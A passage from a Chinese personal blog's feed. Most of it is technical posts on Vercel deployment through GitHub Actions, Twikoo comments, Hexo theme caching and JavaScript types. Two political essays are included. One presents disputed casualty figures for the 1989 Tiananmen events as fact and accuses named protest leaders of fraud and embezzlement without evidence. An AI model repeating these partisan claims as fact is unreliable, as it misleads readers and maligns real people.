        <content type="html"><![CDATA[<p>[TOC]</p><span id="more"></span><h4 id="一、本地vercel-cli手动部署"><a href="#一、本地vercel-cli手动部署" class="headerlink" title="一、本地vercel-cli手动部署"></a>一、本地vercel-cli手动部署</h4><p>在本地npm安装vercel-cli插件，cd 到本地项目目录；<br>选取第三方账号等方式，远程登录vercel，选择 待发布的 vercel项目名；<br>发布项目到 预览环境，或<code>vercel --prod</code>生产环境，成功后会输出 预览链接。</p><h4 id="二、vercel面板-直接部署"><a href="#二、vercel面板-直接部署" class="headerlink" title="二、vercel面板 直接部署"></a>二、vercel面板 直接部署</h4><p>登录vercel面板，导入github仓库，直接发布。<br>只要不断开vercel与git仓库的链接，git仓库有新推送，vercel便会同步部署。</p><p><img src="/posts/vercel-bu-shu-fang-shi-tan-tao/vercel-git.webp" alt="vercel-git"></p><h4 id="三、github-actions-VERCEL-TOKEN"><a href="#三、github-actions-VERCEL-TOKEN" class="headerlink" title="三、github actions + VERCEL_TOKEN"></a>三、github actions + VERCEL_TOKEN</h4><p>登录vercel面板，新建一个token，并存入到github仓库中的“仓库secret”处，取名为VERCEL_TOKEN；<br>新建work actions，在<code>.github/workflows/deploy.yml</code>中利用$自主地 部署项目到 vercel平台。</p><p>解释：部署到生产命令<code>vercel --prod</code>结束后会输出一段信息，进而通过<code>| grep -o</code>过滤出这段信息中的“预览链接”，而变量<code>DEPLOYMENT_URL</code>会通过<code>$()</code>接收这个链接字符串。之后保存到deployment_output.txt中。</p>   <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">name: Deploy to Vercel</span><br><span class="line">on:</span><br><span class="line">  push:</span><br><span class="line">    branches:</span><br><span class="line">      - master  # 当推送到 master 分支时触发</span><br><span class="line">jobs:</span><br><span class="line">  deploy:</span><br><span class="line">    runs-on: ubuntu-latest</span><br><span class="line">    environment: vercel-prod  # 设置环境为 vercel    </span><br><span class="line">    steps:</span><br><span class="line">      - name: Checkout repository</span><br><span class="line">        uses: actions/checkout@v2</span><br><span class="line"></span><br><span class="line">      - name: Install Vercel CLI</span><br><span class="line">        run: npm install -g vercel</span><br><span class="line"></span><br><span class="line">      - name: Deploy to Vercel</span><br><span class="line">        env:</span><br><span class="line">          VERCEL_TOKEN: $&#123;&#123; secrets.VERCEL_TOKEN &#125;&#125;</span><br><span class="line">        run: |</span><br><span class="line">          # 执行一次部署，并从部署成功的输出日志中，提取当前的 部署成功url</span><br><span class="line">          DEPLOYMENT_URL=$(vercel --prod --token $&#123;&#123; secrets.VERCEL_TOKEN &#125;&#125; --yes | grep -o &#x27;https://[a-zA-Z0-9./?=_-]*&#x27;)</span><br><span class="line">          # 或 从所有生产部署的输出日志中，查找到所有的 部署成功url，获取最新的url</span><br><span class="line">          # DEPLOYMENT_URL=$(vercel --token $&#123;&#123; secrets.VERCEL_TOKEN &#125;&#125; ls --prod | grep -o &#x27;https://[^ ]*&#x27; | head -n 1)</span><br><span class="line">          echo $DEPLOYMENT_URL &gt; deployment_output.txt</span><br><span class="line">        id: deploy</span><br><span class="line"></span><br><span class="line">      - name: Output Deployment URL</span><br><span class="line">        run: cat deployment_output.txt</span><br><span class="line">        if: success()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="四、github-actions触发vercel-hook"><a href="#四、github-actions触发vercel-hook" class="headerlink" title="四、github actions触发vercel-hook"></a>四、github actions触发vercel-hook</h4><p>登录vercel面板，申请一个直接交给github actions的执行的，用于vercel部署的hook钩子；<br>将该hook钩子存入到github仓库中的“仓库secret”处，取名为VERCEL_DEPLOY_HOOK；只要githubAction中触发该hook即可强制部署：</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- name: Trigger Vercel Deploy Hook</span><br><span class="line">        run: curl -X POST $&#123;&#123; secrets.VERCEL_DEPLOY_HOOK &#125;&#125;</span><br></pre></td></tr></table></figure><p>   <img src="/posts/vercel-bu-shu-fang-shi-tan-tao/vercel-git-hook.webp" alt="vercel-git-hook"></p><p>另外，可结合vercel中的<code>PROJECT_ID</code>和<code>VERCEL_TOKEN</code>,访问接口<code>https://api.vercel.com/v6/deployments?projectId=YOUR_PROJECT_ID</code>，获取最近的部署信息，进一步获取部署成功的 项目链接：</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- name: Get Deployment URL</span><br><span class="line">        run: |</span><br><span class="line">          sleep 10  # 等待部署完成</span><br><span class="line">          DEPLOYMENT_URL=$(curl -s &quot;https://api.vercel.com/v6/deployments?projectId=YOUR_PROJECT_ID&quot; \</span><br><span class="line">            -H &quot;Authorization: Bearer $&#123;&#123; secrets.VERCEL_TOKEN &#125;&#125;&quot; \</span><br><span class="line">            | jq -r &#x27;.deployments[0].url&#x27;)</span><br><span class="line">          echo &quot;Deployment URL: $DEPLOYMENT_URL&quot;</span><br></pre></td></tr></table></figure><p>完整版：</p>   <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">name: Deploy to Vercel</span><br><span class="line"></span><br><span class="line">on:</span><br><span class="line">  push:</span><br><span class="line">    branches:</span><br><span class="line">      - master  # 当推送到 master 分支时触发</span><br><span class="line"></span><br><span class="line">jobs:</span><br><span class="line">  deploy:</span><br><span class="line">    runs-on: ubuntu-latest</span><br><span class="line">environment: vercel-prod</span><br><span class="line">    steps:</span><br><span class="line">      - name: Checkout repository</span><br><span class="line">        uses: actions/checkout@v2</span><br><span class="line"></span><br><span class="line">      - name: Trigger Vercel Deploy Hook</span><br><span class="line">        run: curl -X POST $&#123;&#123; secrets.VERCEL_DEPLOY_HOOK &#125;&#125;</span><br><span class="line"></span><br><span class="line">      - name: Get Deployment URL</span><br><span class="line">        run: |</span><br><span class="line">          sleep 10  # 等待部署完成</span><br><span class="line">          DEPLOYMENT_URL=$(curl -s &quot;https://api.vercel.com/v6/deployments?projectId=YOUR_PROJECT_ID&quot; \</span><br><span class="line">            -H &quot;Authorization: Bearer $&#123;&#123; secrets.VERCEL_TOKEN &#125;&#125;&quot; \</span><br><span class="line">            | jq -r &#x27;.deployments[0].url&#x27;)</span><br><span class="line">          echo &quot;Deployment URL: $DEPLOYMENT_URL&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出日志：</p><p> <img src="/posts/vercel-bu-shu-fang-shi-tan-tao/vercel-hook.webp" alt="vercel-hook"></p><h4 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h4><blockquote><p>除了第一种 <code>本地vercel-cli</code>，其他（vercel Deployment Hook，github action）方式，只要git远程仓库有新推送，便自动部署项目到 vercel平台；当在主支推送时，默认部署至vercel生产环境。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vercel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>公权力的牢笼</title>
      <link href="/posts/gong-quan-li-de-lao-long/"/>
      <url>/posts/gong-quan-li-de-lao-long/</url>
      
        <content type="html"><![CDATA[<p>媒体可以不忘初心且负责地行使<code>监督权</code>，也可以沉沦为权力斗争、甚至颠覆政府的工具。</p><p>人民的<code>监督权</code>与政府<code>公权力</code>本就是此消彼长，<code>缺乏信任</code>的关系。</p><p>人民有人权和知情权，记者探究事实并公布于众并没错。政府为了社会稳定，不动摇执政根基，一致口径掩盖工作失误甚至官员丑闻也能理解。</p><p>单靠<code>领导自觉</code>是不靠谱的，人也是会变的。若遇见智者，一直走正确的路还好。倘若遇见“川建国”之流，伤人不利己的事情一个不落，人民就等着咽下苦果。而将公权力关进<code>制度的笼子</code>，建立行之有效的监督制度，就是政治体制改革需要努力的方向。即便迫于社会稳定等客观条件的压力暂时做不到，只要能”准确且及时地下情上达、矢志不渝地遏制腐败……..”，政权还是能<code>保鲜</code>的。</p><p>“改善人民生活，提升人均教育水平”仍是现阶段的首要任务。也许有朝一日，人民生活富足，辨得清某些自媒体的“带风向”之论，这一问题自然会得以解决。我对此有信心，可以保持关注，多给点耐心。</p><div class="note info icon flat"><p>吐槽：</p></div><div class="tip home"><ol><li>美国的<code>三权分立</code>理想很丰满，华尔街的聪明人眼看着“川建国”胡搞，能拦住他也不容易吧？</li><li>西媒 冷处理<code>棱镜门、日本排污、北溪管道被炸......</code>，双标<code>暴力抗议</code>，却常年不遗余力地<code>抹黑造谣</code>中国，这些自由媒体的职业操守呢？</li><li>民主化的台湾作为<code>民主标杆</code>，政论产业发达，人民政治生活丰富。台湾人民和媒体无时无刻不在“监督”政府，质询官员时骂得<code>热闹非凡</code>。重点是，骂来骂去，最后问题解决了吗？<code>绿媒</code>更是沦为<code>抹黑造谣</code>的政治工具，靠他们监督政府？</li></ol></div><p>李光耀 曾说：<mark class="hl-label red">“发展中国家若过早地追求西式民主化，只会给国家发展带来阻碍”</mark> ，我深以为然。</p><p>华夏大地上，“分久必合，合久必分”的历史循环一再上演。无论新朝首任再怎么雄才伟略、知人善任，只要后世<code>松懈了、腐败了、不顾生民......</code>，走投无路的人民自然会<code>改弦更张</code>！执政者希望<code>国祚</code>多久，无非是<code>自我改革</code>和<code>被革命</code>之间做取舍。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 政治 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>骗子柴林吾</title>
      <link href="/posts/pian-zi-chai-lin-wu/"/>
      <url>/posts/pian-zi-chai-lin-wu/</url>
      
        <content type="html"><![CDATA[<p><img src="https://imgbed.eamon.dpdns.org/file/1751278054039_%E6%9F%B4%E5%90%BE%E6%9E%97.webp" alt="历史罪人”柴吾林“"></p><p>柴吾林 之流，对治国理政一窍不通却妄图取而代之。柴吾二人 溜得比谁都快，拱火 让别人去送死 来满足自己 膨胀的虚荣心。几十年如一日地造谣抹黑，拿着当年的“人血馒头”不撒手。他们若能当回“红卫兵”，相信会像《茶馆》里的“打手”一样，必定干得“十分出色”。 </p><p>侯刘 这些“尊重事实，懂得反思”的人才值得尊敬！温总理 提到的“政治体制改革”有必要，但要注意时机和方式。不然稍有不慎，就会变成台湾那种“政党恶斗、族群对立”，<code>垃圾民主</code>的典范。</p><p><code>官倒</code>实属可恨，但换他们上位就行了？民主，或专制，与<code>贪污</code>无必然联系。<code>绝食抗议</code> 终于争取来了与总理交流的机会，吾 却“吊儿郎当，不谈具体诉求”，反而故作高姿态、无底线地<code>要胁</code>执政党做出让步。这是<code>提诉求</code>的态度吗？试问哪个执政党能容忍“如此无礼”？也就是邓公他们理解国民的不满情绪，在乎抗议学生的性命。若换做老美早就暴力驱散了！<code>吾</code>鼓动别人绝食，自己却<code>开小灶</code>，还将募集资金用于个人挥霍。指望他<code>反官倒</code>？<code>吾</code>贪得比谁都欢。</p><p>此次风波，给社会和群众带来了严重损失——部分解放军惨死，市民学生伤亡，总计约二三百人。刘 作为组织者之一，不管出发点再怎么好，事实上也确实助推了骚乱升级，应承担部分责任。2019年的香港黑暴，就是此次事件的<code>重现</code>。积极意义就是，让很多被西媒误导的、不明当年真相香港人民，亲身感受那只<code>输出动乱的无形的手</code>，彻底认清西方的<code>丑恶嘴脸</code>。</p><h3 id="港-某博主："><a href="#港-某博主：" class="headerlink" title="港 某博主："></a>港 某博主：</h3><div class="video-container"><iframe width="560" height="315" src="https://www.youtube.com/embed/DKncLtTtuUc?si=4D6wi-1nl0cq3GTS" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe></div><style>.video-container {    position: relative;    width: 100%;    padding-top: 56.25%; /* 16:9 aspect ratio (height/width = 9/16 * 100%) */}.video-container iframe {    position: absolute;    top: 0;    left: 0;    width: 100%;    height: 100%;}</style>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 政治 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Twikoo部署</title>
      <link href="/posts/twikoo-bu-shu/"/>
      <url>/posts/twikoo-bu-shu/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="部署方式（推荐1、2，大陆直连）"><a href="#部署方式（推荐1、2，大陆直连）" class="headerlink" title="部署方式（推荐1、2，大陆直连）"></a>部署方式（推荐1、2，大陆直连）</h2><h3 id="1-netlify"><a href="#1-netlify" class="headerlink" title="1.netlify:"></a>1.netlify:</h3><p><a href="https://nt-twikoo.eamon.dpdns.org/.netlify/functions/twikoo">https://nt-twikoo.eamon.dpdns.org/.netlify/functions/twikoo</a></p><iframesrc="https://nt-twikoo.eamon.dpdns.org/.netlify/functions/twikoo"frameborder="0"height="150" width="100%"></iframe><p><a href="https://yujun.netlify.app/.netlify/functions/twikoo">https://yujun.netlify.app/.netlify/functions/twikoo</a></p><iframesrc="https://yujun.netlify.app/.netlify/functions/twikoo"frameborder="0"height="150" width="100%"></iframe><h3 id="2-HuggingFace（SMTP端口被封，邮件通知功能-失效！镜像被封，该部署方式失效）"><a href="#2-HuggingFace（SMTP端口被封，邮件通知功能-失效！镜像被封，该部署方式失效）" class="headerlink" title="2.HuggingFace（SMTP端口被封，邮件通知功能 失效！镜像被封，该部署方式失效）:"></a>2.HuggingFace（SMTP端口被封，邮件通知功能 失效！镜像<code>被封</code>，该部署方式失效）:</h3><p><del><a href="https://mancai-twikoo.hf.space/">https://mancai-twikoo.hf.space/</a></del></p><iframesrc="https://mancai-twikoo.hf.space/"frameborder="0"height="150" width="100%"></iframe><h3 id="3-vercel"><a href="#3-vercel" class="headerlink" title="3. vercel:"></a>3. vercel:</h3><p><a href="https://v-twikoo.eamon.dpdns.org/">https://v-twikoo.eamon.dpdns.org</a></p><iframesrc="https://v-twikoo.eamon.dpdns.org"frameborder="0"height="150" width="100%"></iframe><p><a href="https://twikoo-alpha-blue.vercel.app/">https://twikoo-alpha-blue.vercel.app</a></p><iframesrc="https://twikoo-alpha-blue.vercel.app"frameborder="0"height="150" width="100%"></iframe><h3 id="4-worker"><a href="#4-worker" class="headerlink" title="4.worker:"></a>4.worker:</h3><p><a href="https://twikoowk.eamon.ggff.net/">https://twikoowk.eamon.ggff.net</a></p><iframesrc="https://twikoowk.eamon.ggff.net"frameborder="0"height="150" width="100%"></iframe><p><a href="https://twikoo-cloudflare.z1260750674.workers.dev/">https://twikoo-cloudflare.z1260750674.workers.dev/</a></p><iframesrc="https://twikoo-cloudflare.z1260750674.workers.dev/"frameborder="0"height="150" width="100%"></iframe><h2 id="数据库comment表中-字段的-意义"><a href="#数据库comment表中-字段的-意义" class="headerlink" title="数据库comment表中 字段的 意义:"></a>数据库comment表中 字段的 意义:</h2><p>_id: 这是一个唯一标识该条评论的字符串ID,通常用作MongoDB数据库中的主键。它具有唯一性和重要性,是评论的主要标识。<br>uid: 这是一个唯一标识评论者的字符串ID。它可以用来关联评论与评论者的其他信息,比如头像、用户名等。<br>nick: 这是评论者的昵称,用于在评论中显示评论者的名称。<br>mail: 这是评论者的邮箱地址,可用于联系评论者或进行邮件通知。<br>mailMd5: 这是评论者邮箱地址的MD5哈希值,用于gravatar头像服务的集成。<br>link: 这是评论者的个人网站链接,可以在评论中展示。<br>ua: 这是评论者使用的用户代理字符串,可以用于分析评论者的设备和浏览器信息。<br>ip: 这是评论者的IP地址,可用于分析评论来源和检测异常情况。<br>master: 这个标志是否是博主的评论,0表示普通用户评论,1表示博主评论。</p><div class="note warning modern"><p>注意：关于评论所在的post页面链接！本地环境有 显性的<code>.html</code>后缀。而 生产环境 表面 无后缀 且以表面形式保存到了数据库中（生产环境实际是html页面，但线上环境会自动隐藏<code>.html</code>后缀）</p></div><p>url: 这是评论所在页面的URL。<br>href: 这是评论所在页面的完整URL（邮件通知中，评论所在的页面链接）。</p><p>comment: 这是评论的内容文本。<br>pid: 这是父级评论的ID,用于实现评论的层级关系。<br>rid: 这是回复评论的ID,用于将回复与被回复的评论关联起来。<br>isSpam: 这个标志是否将该评论识别为垃圾评论,0表示正常评论,1表示垃圾评论。<br>created: 这是评论创建的Unix时间戳,用于评论的时间排序。<br>updated: 这是评论最后更新的Unix时间戳。<br>like: 这是对该评论的点赞信息,以JSON数组的形式存储。<br>top: 这个标志是否将该评论置顶,0表示普通评论,1表示置顶评论。<br>avatar: 这是评论者的头像URL,可用于在评论中显示头像。</p><p>总的来说,这些字段涵盖了评论的各个方面,包括评论者信息、评论内容、评论关系、评论状态等,为Twikoo提供了丰富的数据支持。其中,_id、uid和created等字段是比较重要的,可以作为数据的主键和索引。</p><h2 id="导入数据库中的数据，需注意："><a href="#导入数据库中的数据，需注意：" class="headerlink" title="导入数据库中的数据，需注意："></a>导入数据库中的数据，需注意：</h2><blockquote><p>1.url,href的路径是否还存在，且 不同环境下 的页面路径与数据库中的路径一致（注意路径是否有<code>.html</code>后缀！！），不然即便导入成功也无处渲染。<br>2.like字段，与“点赞者”创建 赞 时，保留的 赞id和个人信息 有依赖关系。<br>3.每个评论的”_id”是唯一的。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Anzhiyu-Theme探讨</title>
      <link href="/posts/anzhiyu-theme-tan-tao/"/>
      <url>/posts/anzhiyu-theme-tan-tao/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="一、-网站（主要）目录结构："><a href="#一、-网站（主要）目录结构：" class="headerlink" title="一、 网站（主要）目录结构："></a>一、 网站（主要）目录结构：</h2><div class="tip info"><p>“tree &#x2F;f &gt; tree.txt”命令，将当前目录下的 所有文件夹及文件 以“文件树”形式输出到当前路径下的tree.txt中。</p></div><div class="tip cogs"><p>blog&#x2F;source文件夹下：</p></div><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">│  ads.txt</span><br><span class="line">│  cacheList.json</span><br><span class="line">│  manifest.json</span><br><span class="line">│  README.md</span><br><span class="line">│  update.json</span><br><span class="line">│  </span><br><span class="line">├─about</span><br><span class="line">│      index.md</span><br><span class="line">│      </span><br><span class="line">├─archives</span><br><span class="line">│      index.md</span><br><span class="line">│      </span><br><span class="line">├─categories</span><br><span class="line">│      index.md</span><br><span class="line">│      </span><br><span class="line">├─icons</span><br><span class="line">│      icon-192x192.png</span><br><span class="line">│      </span><br><span class="line">├─tags</span><br><span class="line">│      index.md</span><br><span class="line">│      </span><br><span class="line">├─_data</span><br><span class="line">│      about.yml</span><br><span class="line">│      link.yml</span><br><span class="line">│      </span><br><span class="line">├─_drafts</span><br><span class="line">└─_posts</span><br><span class="line">    │  absolute探讨.md</span><br></pre></td></tr></table></figure><div class="tip cogs"><p>blog&#x2F;public文件夹下：</p></div>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">│  ads.txt</span><br><span class="line">│  cacheList.json</span><br><span class="line">│  manifest.json</span><br><span class="line">│  README.md</span><br><span class="line">│  update.json</span><br><span class="line">│  (上面从是source经`hexo g`来的)</span><br><span class="line">│</span><br><span class="line">│  404.html</span><br><span class="line">│  index.html</span><br><span class="line">│  search.xml</span><br><span class="line">│  sitemap.txt</span><br><span class="line">│  sw-dom.js</span><br><span class="line">│  sw.js</span><br><span class="line">│  </span><br><span class="line">├─about</span><br><span class="line">│      index.html</span><br><span class="line">│      </span><br><span class="line">├─archives</span><br><span class="line">│  │  index.html</span><br><span class="line">│  │                                 </span><br><span class="line">├─categories</span><br><span class="line">│  │  index.html</span><br><span class="line">│  │  </span><br><span class="line">│  ├─learning</span><br><span class="line">│  │  │  index.html    </span><br><span class="line">├─css</span><br><span class="line">│      index.css    </span><br><span class="line">├─icons</span><br><span class="line">│      icon-192x192.png</span><br><span class="line">├─img</span><br><span class="line">│      10.png    </span><br><span class="line">├─js</span><br><span class="line">│  │  main.js            </span><br><span class="line">├─page</span><br><span class="line">│  ├─2</span><br><span class="line">│  │      index.html       </span><br><span class="line">├─posts</span><br><span class="line">│  │  absolute_tan_tao.html</span><br></pre></td></tr></table></figure><h2 id="二、hexo-swpp-3-3-1和swpp-backends-2-3-11"><a href="#二、hexo-swpp-3-3-1和swpp-backends-2-3-11" class="headerlink" title="二、hexo-swpp@3.3.1和swpp-backends@2.3.11"></a>二、<code>hexo-swpp@3.3.1</code>和<code>swpp-backends@2.3.11</code></h2><div class="tip cogs"><ol><li>注意两者的版本要相兼容，且不能太高；</li><li>“<a href="mailto:&#x68;&#101;&#120;&#111;&#x2d;&#115;&#x77;&#x70;&#112;&#64;&#x34;&#46;&#48;&#46;&#x30;&#x2d;&#97;&#108;&#x70;&#104;&#x61;&#46;&#49;&#49;&#50;">hexo-swpp@4.0.0-alpha.112</a>“和”<a href="mailto:&#115;&#119;&#112;&#x70;&#45;&#98;&#97;&#x63;&#107;&#101;&#x6e;&#100;&#x73;&#x40;&#51;&#46;&#48;&#x2e;&#x30;&#x2d;&#x61;&#x6c;&#x70;&#104;&#x61;&#46;&#x34;&#x32;&#50;">swpp-backends@3.0.0-alpha.422</a>“虽相兼容,但会跳过“主题中的sw-rule.js”，须另外配置seviceWorker服务。</li></ol></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># pwa资源优化</span><br><span class="line">swpp:</span><br><span class="line">  # 是否启用插件</span><br><span class="line">  enable: true</span><br><span class="line">  # 是否在发布前自动执行脚本</span><br><span class="line">  auto_exec: false</span><br><span class="line">  npm_url: &#x27;https://registry.npmmirror.com&#x27;</span><br></pre></td></tr></table></figure><h2 id="三、update-json和cacheList-json"><a href="#三、update-json和cacheList-json" class="headerlink" title="三、update.json和cacheList.json"></a>三、<code>update.json</code>和<code>cacheList.json</code></h2><ol><li>这两个文件是<code>hexo swpp</code>命令同时生成的（前提是<code>_config.yml</code>中的swpp选项<code>auto_exec:false</code>！否则<code>hexo swpp</code>命令无效，只能经<code>hexo d</code>命令才可生成！）。<br><img src="/posts/anzhiyu-theme-tan-tao/hexo-swpp.PNG" alt="hexo-swpp"></li><li>只有 存在于<code>cacheList.json</code>文件列表中的资源，才能被seviceWorker缓存；该文件列表的变动会随即影响<code>update.json</code>中的内容（记录更新了哪些文件，更新seviceWorker的版本号）。</li><li>服务器根目录必须有<code>update.json</code>，用于“记录sw中的文件更新并更改sw缓存版本号”；若网站根目录（包括服务器根目录）缺失该文件，执行<code>hexo swpp</code>会报错；故直接放到source目录，首次新建<code>update.json</code>并推送到服务器，今后<code>hexo swpp</code>会自动以服务器上的update.json为基础“记录sw中的文件更新并更改sw缓存版本号”，并同步到本地public中的<code>update.json</code>。</li><li><code>cacheList.json</code>的生成出口是<code>public/</code>；执行<code>hexo g</code>后该目录会被删除；所以当不执行<code>hexo swpp</code>，或<code>auto_exec:false</code>条件下也不执行<code>hexo d</code>时，为保证服务器根目录一直存在<code>cacheList.json</code>，须直接拷贝一份到<code>source/</code>下。</li></ol> <div class="tip bolt"><ol><li>今后即便直接<code>hexo g</code>不再执行<code>hexo swpp</code>也有 旧<code>cacheList.json</code>可推送到服务器;</li><li>若<code>hexo g</code>后，继续执行<code>hexo swpp</code>会生成<code>cacheList.json</code>覆盖旧的；同时public中的<code>update.json</code>会以服务器上的<code>update.json</code>为基准，记录变动的内容，本地public中的<code>update.json</code>自动与服务器同步。</li></ol></div>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> anzhiyu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Js数据类型转换,及运算符</title>
      <link href="/posts/js-shu-ju-lei-xing-zhuan-huan-ji-yun-suan-fu/"/>
      <url>/posts/js-shu-ju-lei-xing-zhuan-huan-ji-yun-suan-fu/</url>
      
        <content type="html"><![CDATA[<p><strong>一、不同的数据类型会占用不同大小的内存空间，为数据指定相应的数据类型，可以更合理地使用内存。</strong></p><p><strong>二、js中的数据类型（7种原始类型&#x2F;基本类型，1种引用类型&#x2F;复杂类型）</strong><br>原始类型&#x2F;基本类型：Number,String,Boolean,Null,Undifined,BigInt,Symbol<br>引用类型&#x2F;复杂类型: Object</p><p>typeof 操作符【此为操作符，并非构造函数！typeof()中的()只是将后续的内容当做一个整体而已，非必须有】<br>作用：以 字符串形式 返回 变量中值的 数据类型。<br>“undefined”表示 变量 已使用var,let等关键字声明，但未赋值（初始化）;<br>“boolean”表示为 变量值的 数据类型为 布尔值;<br>“string”表示为字符串;<br>“number”表示为数值;<br>“object”表示为对象；（变量值为null时， typeof测出来的数据类型是object —特殊情况）<br>“function”表示为函数;<br>“symbol”表示为符号；</p> <span id="more"></span><p><code>1.Number</code><br>一般值：整数，小数（又称 浮点数，小数运算之前，必须先把小数转换为整数！）；<br>特殊值：NAN, Infinity, MAX_VALUE, MIN_VALUE</p><p>NaN (为not a number的简写)代表一个计算错误，它是一个错误的操作所得到的结果；console.log(10 * “abc”); &#x2F;&#x2F; NaN<br>NaN和任何数据进行运算，结果都是NaN。<br>Infinity, 无穷大 ；-Infinity, 负无穷大 【1&#x2F;0 在js中值为无穷大，java中会直接报错】</p><p>MAX_VALUE, MIN_VALUE（最大正数值，最小正数值）<br>用法：<br>var min &#x3D; Number.MIN_VALUE;<br>var max &#x3D; Number.MAX_VALUE;</p><p>isNaN()构造函数<br>用法及作用<br>isNaN(num)，判断num值为NaN则返回true</p><p><code>2.String</code><br>var str &#x3D; ‘qwer’;<br>str.length获取str的length<br>str[1]获取str的第2个字母</p><p>字符串的拼接【’+’遇到 字符串，直接解释为 字符串拼接】<br>转义字符（&#39;、&quot;引号的 转义，\n换行等）<br>es6中的 模板字符串。用法（反引号中直接写 包含 以${}包裹变量名的 字符串）：<code>qwer$&#123;变量名&#125;erter</code></p><p><code>3.Boolean(共2个值，非true即false)</code><br>关系运算符 返回的结果，就是布尔数据类型。console.log(2 &gt; 1);   &#x2F;&#x2F;true<br>‘!’的 取反 操作。<br><code>4.Undefined(只有1个值undefined)</code><br>变量 已使用var,let等关键字声明，但未赋值（初始化） 时，该变量的数据类型为Undefined。被动的，很少主动用！<br>   var uname;<br>   console.log(uname);  &#x2F;&#x2F;变量的值 默认为 undefined<br>   console.log(typeof uname);  &#x2F;&#x2F;变量中值的 数据类型 为undefined<br><code>5.Null(只有1个值Null）</code><br>用法（给一个已经声明的变量进行初始化，经常用！）：var user &#x3D; null;<br><code>6.Object</code><br>可以表示一组数据，是其他数据的一个集合。可看作一个容器，是js中众多容器 {}  []  set map…中的一种。</p><p><strong>三、js中的 